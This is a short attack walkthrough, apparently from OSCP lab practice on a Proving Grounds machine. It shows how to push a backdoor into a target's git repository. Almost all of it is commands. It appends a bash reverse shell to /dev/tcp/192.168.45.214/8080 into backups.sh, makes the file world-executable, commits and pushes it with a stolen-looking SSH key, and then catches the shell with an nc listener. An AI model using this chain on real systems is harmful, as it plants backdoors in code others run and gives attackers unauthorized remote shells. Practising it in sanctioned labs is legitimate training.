
---

Let's assume we downloaded the git repo from the target onto our local machine and we are authenticated with an user who has access to the git repo.

We can utilize the following Syntax in order to push modifications from our local machine onto the remote repository.

1. Step: Navigate into the git directory in our local machine and add an user into the config.

```
git config --global user.name "hacker"
git config --global user.email "hacker@hacker.(none)"
```

Add malicious reverse shell script onto an file e.G .sh file

```
echo "sh -i >& /dev/tcp/192.168.45.214/8080 0>&1" >> backups.sh 
```

Give the script executable perms.

```
chmod 777 backups.sh
```

Stage changes and push them remotely with the following 3 commands:

```
git add.
git commit -m "pwned."
GIT_SSH_COMMAND='ssh -i /home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Hunit/id_rsa -p 43022' git push origin master
```

Start up listener to catch RCE and gg.

```
nc -lvnp 8080
```